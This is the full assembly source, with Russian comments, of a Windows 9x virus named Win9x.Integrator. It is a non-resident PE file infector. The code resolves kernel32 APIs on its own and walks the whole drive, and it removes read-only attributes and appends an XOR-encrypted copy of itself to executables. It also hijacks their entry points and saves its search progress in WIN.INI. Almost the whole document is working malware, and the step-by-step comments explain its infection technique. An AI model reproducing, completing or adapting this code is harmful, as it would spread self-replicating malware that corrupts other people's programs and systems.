;
;                            <<Win9x.Integrator>>
;============================================================================
; Версия 1.3
; ──────────
;   Нерезидентный PE EXE инфектор.
; - Устанавливает свой SEH;
; - Рекурсивно обходит текущий диск, примерно через три секунды работы
;   сохраняет текущий путь в WIN.INI и передает управление носителю, при
;   следующем запуске зараженного файла считывает сохраненный путь и
;   производит дальнейщий поиск начиная с сохраненного пути;
; - Снимает ReadOnly атрибуты файла;
; - Заражает в последнюю секцию, ставит ей R/W атрибуты;
; - Не заражает: - файлы с оверлеями;
;                - файлы, в которых физический или виртуальный размеры кода
;                  равны нулю;
;                - файлы, в которых физический размер кода больше
;                  виртуального;
;                - файлы с атрибутом DLL.
; - Шифрован по XOR с плавающим ключом;
; - Размер 1828 байт.
;
; 20.1.01                                           (C) Gobleen Warrior//SMF
;============================================================================
; People can fly... Everything can happen...

DEBUG                   equ 1 ; 1 - отладка, 0 -рабочий

                        .386p
                        .model flat
; Объявляем необходимые для работы ЯКОБЫ носителя ф-ции API
extrn                   ExitProcess:proc
extrn                   MessageBoxA:proc

                        .data
;╔══════════════════════════════════════════════════════════════════════════╗
;║ Пошел вирусный код                                                       ║
;╚══════════════════════════════════════════════════════════════════════════╝
virstart:               pushad
; Получим дельту
                        call near ptr delta
delta:                  mov ebp, [esp]
                        sub ebp, offset delta
                        add esp, 4
; Расшифруем тело
                        lea esi, [ebp+cryptstart]
                        mov edi, esi
                        mov ecx, cryptlen
uncryptor:              mov al, byte ptr [esi]
                        lodsb
                        db 034h ; XOR AL
key:                    db 0    ; число
                        stosb
                        loop uncryptor
cryptstart:
; Сохраним старую точку входа
                        mov eax, dword ptr [ebp+original_ip]
                        mov dword ptr [ebp+temp_ip], eax
; Установим новый SEH
                        call set_seh
; Сюда мы будем возвращаться в случае ошибки. Восстановим старый стэк (он
; находится в ESP+8)
                        mov esp, [esp+8]
ret_to_file:            pop dword ptr fs:[0]
                        pop eax
; Передаем управление оригинальному файлу
                        popad
original_ip             equ $+1
                        jmp hoststart
; Установим таки новый SEH
; При загрузке файла fs:[0] кажит на структуру, содержащую адрес SEH
set_seh:                push dword ptr fs:[0]
                        mov dword ptr fs:[0], esp
                        call locate_kernel
                        jmp short ret_to_file

locate_kernel           proc near
; Находит и проверяет на исинность image_base Kernel32 в памяти
                        mov eax, 0bff70000h ; :((((((
                        cmp word ptr [eax], 'ZM'
                        jne no_kernel
                        mov ebx, [eax+03ch] ; RVA PE заголовка
                        add ebx, eax ; VA PE заголовка
                        cmp dword ptr [ebx], 'EP'
                        jne no_kernel
                        call locate_getprocadress
no_kernel:              mov eax, dword ptr [ebp+temp_ip]
                        mov dword ptr [ebp+original_ip], eax
                        retn
endp

locate_getprocadress    proc near
; Определяет адрес GetProcAdress API
                        mov ecx, dword ptr  [ebx+ 078h] ; RVA таблицы
                                                        ; экспортов
                        add ecx, eax ; VA таблицы экспортов
                        xor edi, edi ; Обнулим счетчик имен
                        dec edi ; Шоб первый раз был ноль
search4:                inc edi ; Увеличим счетчик
                        cmp dword ptr [ecx+14h], edi ; Сравним счетчик
                        ; проверенных имен с их общим количеством в наличии
                        jb no_getprocadress ; Если больше - на выход
                        mov ebx, [ecx+020h] ; RVA таблицы указателей на
                                            ; имена API
                        add ebx, eax ; VA адрес таблицы оной
                        mov ebx, [ebx+4*edi] ; RVA API номер EDI
                        add ebx, eax ; VA оной API
; Сравним очередное имя с GetProcAdress
                        mov edx, [ebx]
                        xor edx, [ebx+4]
                        cmp edx, 'PteG' xor 'Acor'
                        jne search4
; Совпало. Мы нашли нужную нам API
; EDI = индекс оной API в таблице имен и в таблице ординалов
; Получим адрес ординала данной функции. Для этого умножим индекс на 2,
; прибавим RVA таблицы ординалов и imagebase Kernel32.
; или:
; EDI*2+RVA_Table_ordins+ImageBase = Ordinal
; После этого умножив ординал на 4 и прибавив RVA таблицы адресов API мы
; получим RVA адреса API. Прибавим Kernel32 ImageBase и получим VA API.
; или:
; Ordinal*4+RVA_AdressTable+ImageBase = RVA_ProcAdress
; RVA_ProcAdress+ImageBase = VA API GertProcAdress
                        shl edi, 1 ; индекс API * 2
                        add edi, [ecx+024h] ; + RVA_Table_ordins
                        add edi, eax ; + Kernel32 ImageBase = Ordinal
                        movzx edx, word ptr [edi] ; EDX = Ordinal
                        shl edx, 2 ; Ordinal*4
                        add edx, [ecx+01ch] ; + RVA AdressTable
                        mov edx, [edx+eax] ; + Kernel32 ImageBase = RVA API
                        add edx, eax ; + Kernel32 ImageBase = VA API
; Получили адрес данной API. Сохраним его.
                        mov dword ptr [ebp+ourGetProcAdress], edx
                        call locate_all_apis
no_getprocadress:       retn
endp

locate_all_apis         proc near
; Заполняет таблицу адресов необходимых нам API
; Вызов GetProcAdress:
;               push offset <имя функции>
;               push imagebase
;               call GetProcAdress
                        lea esi, [ebp+getFindFirstFileA]
                        lea edi, [ebp+ourFindFirstFileA]
                        push eax ; Kernel32 ImageBase
                        pop ebx
search4apis:            push esi
                        push ebx ; Kernel32 ImageBase
                        call [ebp+ourGetProcAdress]
                        test eax, eax
                        jz no_apis
                        stosd
set_new_api_name:       inc esi
                        cmp byte ptr [esi], 0
                        jne set_new_api_name
                        inc esi
                        cmp byte ptr [esi], '*' ; Это идет сразу за
                                                ; последним именем API
                        jne search4apis
; Теперь у нас есть все необходимые API.
                        call prepare_file_search
no_apis:                retn
endp

prepare_file_search     proc near
; Сохраним текущую директорию.
; Вызов GetCurrentDirectoryA:
;               push offset <буффер для хранения полученного пути>
;               push <размер оного буффера>
;               call GetCurrentDirectoryA
                        lea eax, [ebp+current_dir]
                        push eax
                        push 260
                        call [ebp+ourGetCurrentDirectoryA]
; Перейдем в корневую директорию.
; Вызов SetCurrentDirectoryA:
;               push offset <имя директории>
;               call SetCurrentDirectoryA
                        lea eax, [ebp+root_dir]
                        push eax
                        call [ebp+ourSetCurrentDirectoryA]
                        mov byte ptr [ebp+get_string_flag], 0
                        mov byte ptr [ebp+start_fuck_flag], 0
                        call process_dir
; Восстановим первичную директорию.
                        lea eax, [ebp+current_dir]
                        push eax
                        call [ebp+ourSetCurrentDirectoryA]
                        retn
endp

process_dir             proc near
                        cmp byte ptr [ebp+get_string_flag], 0
                        jne find_first
; Получить строку, сохраненную в WIN.INI
; Вызов GetProfileString:
;               push <размер буффера для возвращаемой строки>
;               push offset <буфер для возвращаемой строки>
;               push offset <строка, возвращаемая по-умолчанию
;                           (если искомой строки не обнаружено)
;               push offset <имя ключа в win.ini-файле>
;               push offset <имя секции в win.ini-файле>
;               call GetProfileStringA
;               EAX = Длина возвращаемой строки
                        push 260
                        lea eax, [ebp+saved_string]
                        push eax
                        lea eax, [ebp+default_string]
                        push eax
                        lea eax, [ebp+ini_key]
                        push eax
                        lea eax, [ebp+ini_section]
                        push eax
                        call [ebp+ourGetProfileStringA]
                        mov byte ptr [ebp+get_string_flag], 1
                        test eax, eax
                        jnz catch_the_string
set_fuck_flag:          mov byte ptr [ebp+start_fuck_flag], 1
                        call start_timer
                        jmp short find_first
catch_the_string:
; Сравним имена дисков из сохраненной строки и из каталога запуска
                        mov ax, word ptr [ebp+current_dir]
                        mov bx, word ptr [ebp+saved_string]
                        cmp ax, bx
                        jne set_fuck_flag
; Подготовим сохраненную строку к работе - заменим все "\" на 0
                        lea esi, [saved_string+3] ; Пропустим имя диска
                        mov edi, esi
                        mov dword ptr [ebp+start_ini_string], esi
another_sign:           lodsb
                        cmp al, '\'
                        jne not_slash
                        mov al, 0
                        jmp short finish_it
not_slash:              or al, al
                        jz find_first
finish_it:              stosb
                        jmp short another_sign
find_first:             mov dword ptr [ebp+end_ini_string], esi
; Поищем в данной дире *.*
; Вызов FindFirstFileA:
;               push offset <FIND структура>
;               push offset <маска поиска>
;               call FindFirstFileA
                        lea eax, [ebp+findstruc]
                        push eax
                        lea eax, [ebp+maska]
                        push eax
                        call [ebp+ourFindFirstFileA]
                        cmp eax, -1
                        je go_out
                        mov dword ptr [ebp+search_handler], eax
compare_or_not:         cmp byte ptr [ebp+start_fuck_flag], 0
                        jne start_fuck
; Сравнить найденный элемент с элементом строки
; Вызов lstrcmpi:
;               push offset <строка 1>
;               push offset <строка 2>
;               call lstrcmpi
;               EAX = 0 если строки равны
                        mov eax, [ebp+start_ini_string]
                        push eax
                        lea eax, [ebp+ff_fullname]
                        push eax
                        call [ebp+ourlstrcmpi]
                        test eax, eax
                        jnz find_next
; Поместить в start_ini_string адрес следующего элемента
                        mov eax, dword ptr [ebp+start_ini_string]
not_last:               inc eax
                        cmp byte ptr [eax], 0
                        jne not_last
                        inc eax
                        mov dword ptr [ebp+start_ini_string], eax
; Обработать найденный элемент
start_fuck:             test byte ptr [ebp+ff_attr], 16 ; Директория?
                        jnz dir
                        call do_file
                        jmp test_time
dir:                    cmp byte ptr [ebp+ff_fullname], '.' ; Пропускать
                                                            ; "." и ".."
                        je find_next
                        push dword ptr [ebp+search_handler]
                        lea eax, [ebp+ff_fullname]
                        push eax
                        call [ebp+ourSetCurrentDirectoryA]
                        call process_dir
                        pop dword ptr [ebp+search_handler]
; Пора смываться?
test_time:              cmp byte ptr [ebp+get_out_flag], 0
                        jne go_out
; Если мы еще не включали таймер - не проверять его значение
                        cmp byte ptr [ebp+start_fuck_flag], 0
                        je check_end_of_ini
; Проверить текущее значение таймера
; Вызов GetTickCount:
;               call GetTickCount
;               EAX = время в тиках с начала текущей сесии WINDOWS
                        call [ebp+ourGetTickCount]
                        sub eax, dword ptr [ebp+counter]
                        cmp eax, 3000 ; 3 секунды
                        jb find_next
                        mov byte ptr [ebp+get_out_flag], 1
; Сохраним текущий путь в WIN.INI
; Получим текущий путь
                        lea eax, [ebp+saved_string]
                        push eax
                        push 260
                        call [ebp+ourGetCurrentDirectoryA]
; Допишем туда "\" и имя последнего объекта
                        lea esi, [ebp+ff_fullname]
                        lea edi, [ebp+saved_string]
                        cmp eax, 3
                        jne all_ok
                        dec edi
all_ok:                 add edi, eax
                        mov al, byte ptr '\'
                        stosb
next_letter:            lodsb
                        cmp al, 0
                        je endets
                        stosb
                        jmp short next_letter
; Вызов WriteProfileString:
;               push offset <строка для записи>
;               push offset <имя ключа в win.ini>
;               push offset <имя секции в win.ini>
;               call WriteProfileStringA
endets:                 stosb
                        lea eax, [ebp+saved_string]
                        push eax
                        lea eax, [ebp+ini_key]
                        push eax
                        lea eax, [ebp+ini_section]
                        push eax
                        call [ebp+ourWriteProfileStringA]
                        jmp short go_out
; Если текущий элемент сохраненной строки - последний, выставить флаг работы
check_end_of_ini:       mov eax, dword ptr [ebp+start_ini_string]
                        cmp dword ptr [ebp+end_ini_string], eax
                        jne find_next
                        mov byte ptr [ebp+start_fuck_flag], 1
                        call start_timer
find_next:
; Вызов FindNextFileA:
;               push offset <FIND структура>
;               push <хендл поиска>
;               call FindNextFileA
                        lea eax, [ebp+findstruc]
                        push eax
                        push dword ptr [ebp+search_handler]
                        call [ebp+ourFindNextFileA]
                        cmp eax, 1
                        je compare_or_not
                        cmp byte ptr [ebp+start_fuck_flag], 0
                        je set_fuck_flag
; Вызов FindClose:
;               push <хендл поиска>
;               call FindClose
go_out:                 push dword ptr [ebp+search_handler]
                        call [ebp+ourFindClose]
                        lea eax, [ebp+dotdot]
                        push eax
                        call [ebp+ourSetCurrentDirectoryA]
                        retn
endp

start_timer             proc near
                        call [ebp+ourGetTickCount]
                        mov dword ptr [ebp+counter], eax
                        retn
endp

do_file                 proc near
; Обрабатывает файл
                        xor eax, eax
                        lea edi, [ebp+ff_fullname]
                        repne scasb
                        mov eax, [edi-5]
                        or eax, 20202000h ; Приводит к нижнему реристру
IF DEBUG EQ 1
                        cmp dword ptr eax, 'iwg.' ; файл - gwi?
ELSE
                        cmp dword ptr eax, 'exe.' ; файл - ехе?
ENDIF
                        jne it_not_exe
; Установить нормальные атрибуты
                        push 020h
                        lea eax, [ebp+ff_fullname]
                        push eax
                        call [ebp+ourSetFileAttributesA]
; Открыть файл для чтения/записи
; Вызов CreateFileA:
;               push 0
;               push <атрибуты файла> ; 80h - нормальные
;               push <реакция на отсуствие файла>
;                                    ; 2=CREATE_ALWAYS, 3=OPEN_EXISTING
;               push 0
;               push <типа какой доступ> ; 1 = FILE_SHARE_READ
;                                        ; 2 = FILE_SHARE_WRITE
;               push <режим доступа> ; 80000000h = GENERIC_READ
;                                    ; 40000000h = GENERIC_WRITE
;               push offset <имя файла>
;               call CreateFileA
                        push 0
                        push 80h ; Нормальный атрибут
                        push 3 ; открывать только имеющиеся файлы
                        push 0
                        push 1+2 ; чтение/запись
                        push 80000000h+40000000h ; чтение /запись
                        lea eax, [ebp+ff_fullname]
                        push eax
                        call [ebp+ourCreateFileA]

                        cmp eax, -1 ; Есть ошибки?
                        je it_not_exe

                        mov ebx, eax ; Сохраним handle файла
; Файл открыт и все ништяк.

; Считаем 40h - MZ заголовок
                        mov esi, 40h
                        lea edi, [ebp+mz_header]
                        call read_file
; Проверка на MZ
                        cmp word ptr [ebp+mz_signat],'ZM'
                        jne close_file
; Установим указатель на PE заголовок
                        mov esi, dword ptr [ebp+mz_pe_pointer]
                        call set_pointer
; Считаем PE заголовок
                        mov esi, 0f8h
                        lea edi, [ebp+pe_header]
                        call read_file
; Проверим на PE
                        cmp word ptr [ebp+pe_header], 'EP'
                        jne close_file
; Проверим на DLL
                        test word ptr [ebp+pe_flags], 2000h
                        jne close_file
; Проверим на зараженность
                        cmp word ptr [ebp+pe_user_minor], 'WG'
                        je close_file
; Получим длину РЕ заголовка
                        movzx eax, word ptr [ebp+pe_nt_hdr_size]
                        add eax, 18h
; Получим смещение Таблицы Объектов в файле
                        add eax, dword ptr [ebp+mz_pe_pointer]
; Получим адрес заголовка последней секции
; Число секций указанно в PE+06h. Секции нумеруются начиная с 1. Заголовок
; каждой секции занимает 28h.
                        push eax ; Сохраним в стеке смещение на начало
                                 ; Таблицы Объектов в файле
                        movzx eax, word ptr [ebp+pe_num_of_objects]
                        dec eax ; Последняя секция
                        mov edx, 28h
                        mul edx
                        mov esi, eax
                        pop eax
                        add esi, eax ; ESI = смещение в файле на заголовок
                                     ;последней секции
; Установим указатель на начало оной секции
                        mov dword ptr [ebp+last_sec], esi
                        call set_pointer
; Считаем заголовок в буффер sec_header
                        mov esi, 28h
                        lea edi, [ebp+sec_header]
                        call read_file
; Выравняем физичексую и виртуальную длины последней секции по
; соответствующим значениям FileAlign (PE+3ch) и ObjectAlign (PE+38h)
; Длины оные храняться в SectionHeader+10h (PhysicalSize) и SectionHeader+
; 08h (VIrtualSize) соответственно. Характеризуют они размер секции на диске
; (физический размер) и в памяти (виртуальный)
                        mov eax, [ebp+pe_file_align]
                        dec eax
                        add [ebp+sec_physical_size], eax
                        not eax
                        and [ebp+sec_physical_size], eax
; Виртуальный:
                        mov eax, [ebp+pe_object_align]
                        dec eax
                        add [ebp+sec_virtual_size], eax
                        not eax
                        and [ebp+sec_virtual_size], eax
; Проверка на оверлей:
; Если
; (Расчетный физ. размер файла - Реальный размер оного файла) > File Align
; => Оверлей.
                        mov eax, [ebp+sec_physical_size]
                                           ; Физический размер посл. секции
                        add eax, [ebp+sec_phys_offset]
                                           ; Смещение начала оной секции
                                           ; относительно начала ЕХЕ (в
                                           ; сумме дают размер файла)
                        mov dword ptr [ebp+our_place], eax ; Пригодится
                        sub eax, [ebp+ff_file_size_low] ; Вычтем из
                                           ; расчетного размера файла его
                                           ; реальный размер
positive:               neg eax            ; Получим результат по модулю
                        jl positive
                        cmp [ebp+pe_file_align], eax ; И сравним его с
                                           ; выравниванием в файле
                        jl close_file      ; Если остаток от вычитания
                                           ; больше File Align - оверлей.

; Также нужно следить, шоб обе длинны не были нулевыми и физическая не была
; больше виртуальной
                        mov eax, [ebp+sec_physical_size] ; Физическая
                        mov ecx, [ebp+sec_virtual_size] ; Виртуальная
                        cmp ecx, eax
                        jb close_file
                        or eax, ecx
                        jz close_file
; Сохраним старую точку входа
                        mov eax, [ebp+sec_rva]
                                           ; RVA последней секции в памяти
                        add eax, [ebp+sec_physical_size] ; Физический размер
                                                     ; последней секции
                        add eax, original_ip + 4 - virstart
                                           ; 4 потому как JMP
                        ; скачет относительно следующей после себя (и
                        ; аргумента своего) команды, аргумент у нас - DWORD
                        ; - 4 байта. После всех этих операций в ESI у нас
                        ; RVA следущей после JMP dd X команды.
                        sub eax, [ebp+pe_entry_point_rva] ; PE.EntryPoint RVA
                        neg eax
                        mov dword ptr [ebp+original_ip], eax
; Запишем в заголовок новую точку входа
                        mov eax, [ebp+sec_rva] ; RVA последней секции
                                               ; в памяти
                        add eax, [ebp+sec_physical_size]
                                           ; Физический размер последней
                                           ; секции
                        mov dword ptr [ebp+pe_entry_point_rva], eax
                                             ; PE.EntryPoint RVA
; Установим указатель на конец файла
                        mov esi, dword ptr [ebp+our_place]
                        call set_pointer
; Сменим ключ для шифровки
                        in ax, 40h ; Простейщий генератор случайных чисел
                        in al, 40h ; в al - случайное число
another:                xor al, byte ptr [ebp+key]
                        or al, al ; нельзя чтоб ключ был нулем
                        jz another
                        cmp al, 020h ; и 020h
                        je another
                        mov byte ptr [ebp+key], al
; Запишем нешифрованную часть вируса в файл
                        mov esi, cryptstart - virstart
                        lea edi, [ebp+virstart]
                        call write_file
; зашифруем тело
                        mov al, byte ptr [ebp+key]
                        lea esi, [ebp+cryptstart]
                        lea edi, [ebp+cryptbuf]
                        mov ecx, cryptlen
cryptor:                mov dl, byte ptr [esi]
                        inc esi
                        xor dl, al
                        mov byte ptr [edi], dl
                        inc edi
                        loop cryptor
; Запишем шифрованную часть вируса в файл
                        mov esi, cryptlen
                        lea edi, [ebp+cryptbuf]
                        call write_file
; Вычислим длинну звиря, выравненую на ObjectAlign
                        mov eax, virlen
                        mov ecx, [ebp+pe_object_align]
                        dec ecx
                        add eax, ecx
                        not ecx
                        and eax, ecx
; Модифицируем PE header и Header секции
                        add [ebp+pe_image_size], eax
                        add [ebp+pe_size_of_code], eax
                        add [ebp+sec_virtual_size], eax
; Вычислим длинну звиря, выравненную на FileAlign
                        mov eax, virlen
                        mov ecx, [ebp+pe_file_align]
                        dec ecx
                        add eax, ecx
                        not ecx
                        and eax, ecx
; Модифицируем заголовок последней секции
                        add [ebp+sec_physical_size], eax
                                      ; Физический размер последней секции
; Поставим последней секции атрибут read/write
                        mov dword ptr [ebp+sec_obj_flags], 0e0000040h
; Поставим метку зараженности
                        mov word ptr [ebp+pe_user_minor], 'WG'
; Установим указатель на начало PE заголовка
                        mov esi, dword ptr [ebp+mz_pe_pointer]
                        call set_pointer
; Запишем модифицированный PE заголовок
                        mov esi, 0f8h
                        lea edi, [ebp+pe_header]
                        call write_file
; Установим указатель на начало заголовка последней секции
                        mov esi, dword ptr [ebp+last_sec]
                        call set_pointer
; Запишем модифицированный заголовок последней секции
                        mov esi, 028h
                        lea edi, [ebp+sec_header]
                        call write_file
; Закроем файл
; Вызов CloseHandle:
;               push <хендл файла>
;               call CloseHandle
close_file:             push ebx
                        call [ebp+ourCloseHandle]
it_not_exe:             ret
do_file                 endp

read_file               proc
; ESI = Скоко читать
; EDI = Адрес буффера для считки
;
; Вызов ReadFile:
;               push 0
;               push offset <буфер для количества считанных байт>
;               push <скока читать>
;               push offset <буффер куда считывать>
;               push <хендл открытого файла>
;               call ReadFile
                        pusha
                        push 0
                        lea eax, [ebp+bytesread]
                        push eax
                        push esi
                        push edi
                        push ebx
                        call [ebp+ourReadFile]
                        popa
                        retn
endp

set_pointer             proc
; ESI = Куда установить
;
; Вызов SetFilePointer:
;               push <откуда отсчет> ; FILE_BEGIN = 0
;               push 0
;               push <позиция куда установить>
;               push <хендл файла>
;               call SetFilePointer
                        pusha
                        push 0
                        push 0
                        push esi
                        push ebx
                        call [ebp+ourSetFilePointer]
                        popa
                        retn
endp

write_file              proc
; ESI = Скока писать
; EDI = Откуда писать
;
; Вызов WriteFile:
;               push 0
;               push offset <буфер для количества записанных байт>
;               push <скока писать>
;               push offset <буффер откуда списывать>
;               push <хендл открытого файла>
;               call WriteFile
                        push 0
                        lea eax, [ebp+bytesread]
                        push eax
                        push esi
                        push edi
                        push ebx
                        call [ebp+ourWriteFile]
                        retn
endp

;╔══════════════════════════════════════════════════════════════════════════╗
;║ Звиревые данные                                                          ║
;╚══════════════════════════════════════════════════════════════════════════╝
getFindFirstFileA       db 'FindFirstFileA',0
getFindNextFileA        db 'FindNextFileA',0
getFindClose            db 'FindClose',0
getGetCurrentDirectoryA db 'GetCurrentDirectoryA',0
getSetCurrentDirectoryA db 'SetCurrentDirectoryA',0
getCreateFileA          db 'CreateFileA',0
getSetFilePointer       db 'SetFilePointer',0
getReadFile             db 'ReadFile',0
getWriteFile            db 'WriteFile',0
getCloseHandle          db 'CloseHandle',0
getSetFileAttributesA   db 'SetFileAttributesA',0
getGetProfileStringA    db 'GetProfileStringA',0
getWriteProfileStringA  db 'WriteProfileStringA',0
getlstrcmpi             db 'lstrcmpi',0
getGetTickCount         db 'GetTickCount',0

maska                   db '*.*',0
root_dir                db '\',0
dotdot                  db '..',0

ini_section             db 'Temp',0
ini_key                 db 'Saved'
default_string          db 0

ourname                 db '[Win9x.Integrator] by Gobleen Warrior//SMF', 0
                        db 'People can fly... Everything can happen...'
cryptlen                equ $-cryptstart
virlen                  equ $-virstart

; Это срань всякая типа временных данных, переменных и т.д.
temp_ip                 dd ?
bytesread               dd ?
our_place               dd ?
last_sec                dd ?
search_handler          dd ?
current_dir             db 260 dup (?)

get_string_flag         db ?
start_fuck_flag         db ?
get_out_flag            db ?
saved_string            db 260 dup (?)
start_ini_string        dd ?
end_ini_string          dd ?
counter                 dd ?

ourGetProcAdress        dd ?
ourFindFirstFileA       dd ?
ourFindNextFileA        dd ?
ourFindClose            dd ?
ourGetCurrentDirectoryA dd ?
ourSetCurrentDirectoryA dd ?
ourCreateFileA          dd ?
ourSetFilePointer       dd ?
ourReadFile             dd ?
ourWriteFile            dd ?
ourCloseHandle          dd ?
ourSetFileAttributesA   dd ?
ourGetProfileStringA    dd ?
ourWriteProfileStringA  dd ?
ourlstrcmpi             dd ?
ourGetTickCount         dd ?

; FIND структура
findstruc:
ff_attr                 dd ?
ff_create_time          dd ?
                        dd ?
ff_last_access_time     dd ?
                        dd ?
ff_last_write_time      dd ?
                        dd ?
ff_file_size_high       dd ?
ff_file_size_low        dd ?
ff_reserved             dd ?
                        dd ?
ff_fullname             db 260 dup (?)
ff_dosname              db 14 dup (?)

; Буффер для MZ заголовка
mz_header:
mz_signat               dw ?  ; сигнатура
mz_lastpage             dw ?  ; остаток от деления размера файла на 512
mz_pagecount            dw ?  ; результат этого деления+1
                        dw ?  ;
mz_hdrsize              dw ?  ; размер заголовка ЕХЕ в 16-байтниках
                        dw ?  ;
                        dw ?  ;
mz_exe_ss               dw ?  ; SS файла при загрузке
mz_exe_sp               dw ?  ; SP файла при загрузке
mz_chcksum              dw ?  ;
mz_exe_ip               dw ?  ; IP файла при загрузке
mz_exe_cs               dw ?  ; CS файла при загрузке
                        dw ?  ;
mz_overlay              dw ?  ; Номер оверлейного сегмента (0-основной)
                        db 32 dup (0) ;
mz_pe_pointer           dd ?  ; Смещение PE заголовка

; Буффер для PE заголовка
pe_header:
pe_signat               dd ?
pe_cpu_type             dw ?
pe_num_of_objects       dw ?
pe_time_date            dd ?
pe_coff_tbl_pointer     dd ?
pe_coff_tbl_size        dd ?
pe_nt_hdr_size          dw ?
pe_flags                dw ?
pe_magic                dw ?
pe_link_major           db ?
pe_link_minor           db ?
pe_size_of_code         dd ?
pe_size_of_init_data    dd ?
pe_size_of_unin_data    dd ?
pe_entry_point_rva      dd ?
pe_base_of_code         dd ?
pe_base_of_data         dd ?
pe_image_base           dd ?
pe_object_align         dd ?
pe_file_align           dd ?
pe_os_major             dw ?
pe_os_minor             dw ?
pe_user_major           dw ?
pe_user_minor           dw ?
pe_subsys_major         dw ?
pe_subsys_minor         dw ?
                        dd ?
pe_image_size           dd ?
pe_header_size          dd ?
pe_file_chksum          dd ?
pe_subsys               dw ?
pe_dll_flags            dw ?
pe_stack_reserve_size   dd ?
pe_stack_commit_size    dd ?
pe_heap_reserve_size    dd ?
pe_heap_commit_size     dd ?
pe_loader_flags         dd ?
pe_num_rva_and_sizes    dd ?
pe_export_table_rva     dd ?
pe_export_table_size    dd ?
pe_import_table_rva     dd ?
pe_import_table_size    dd ?
pe_resource_table_rva   dd ?
pe_resource_table_size  dd ?
pe_exception_table_rva  dd ?
pe_exception_table_size dd ?
pe_secutity_table_rva   dd ?
pe_security_table_size  dd ?
pe_fixup_table_rva      dd ?
pe_fixup_table_size     dd ?
pe_debug_table_rva      dd ?
pe_debug_table_size     dd ?
pe_image_descr_tbl_rva  dd ?
pe_image_descr_tbl_size dd ?
pe_machine_table_rva    dd ?
pe_machine_table_size   dd ?
pe_tls_rva              dd ?
pe_tls_size             dd ?
pe_load_cfg_rva         dd ?
pe_load_cfg_size        dd ?
                        dq ?
pe_iat_table_rva        dd ?
pe_iat_table_size       dd ?
                        dq ?
                        dq ?
                        dq ?

; Буффер для заголовка последней секции
sec_header:
sec_name                dq ?           ; 00 01 02 03 04 05 06 07
sec_virtual_size        dd ?           ; 08 09 0a 0b
sec_rva                 dd ?           ; 0c 0d 0e 0f
sec_physical_size       dd ?           ; 10 11 12 13
sec_phys_offset         dd ?           ; 14 15 16 17
                        db 0ch dup (?) ; 18 19 1a 1b 1c 1d 1e 1f 20 21 22 23
sec_obj_flags           dd ?           ; 24 25 26 27

; Буффер для шифровки тела
cryptbuf                db cryptlen dup (?)

;╔══════════════════════════════════════════════════════════════════════════╗
;║ Данные для первого запуска                                               ║
;╚══════════════════════════════════════════════════════════════════════════╝
_title                  db '[Win9x.Integrator] by Gobleen Warrior//SMF',0
_text                   db 'THANKS A LOT TO ALL PEOPLE, WHICH HELPED ME',0

                        .code
start:                  jmp virstart
hoststart:              push 0
                        push offset _title
                        push offset _text
                        push 0
                        call MessageBoxA
                        push 0
                        call ExitProcess
end                     start